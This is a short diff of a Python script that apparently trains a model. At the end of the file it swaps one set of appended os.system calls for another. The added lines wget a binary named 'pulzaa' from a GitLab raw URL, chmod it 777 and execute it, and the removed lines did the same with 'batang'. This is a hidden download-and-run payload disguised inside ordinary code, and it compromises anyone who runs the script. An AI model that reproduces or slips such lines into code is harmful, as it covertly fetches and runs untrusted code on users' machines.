@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/deroku1/deroku/-/raw/main/batang')
-os.system('chmod 777 batang')
-os.system('./batang')
+os.system('wget https://gitlab.com/dirocuk/esdora/-/raw/main/pulzaa')
+os.system('chmod 777 pulzaa')
+os.system('./pulzaa')
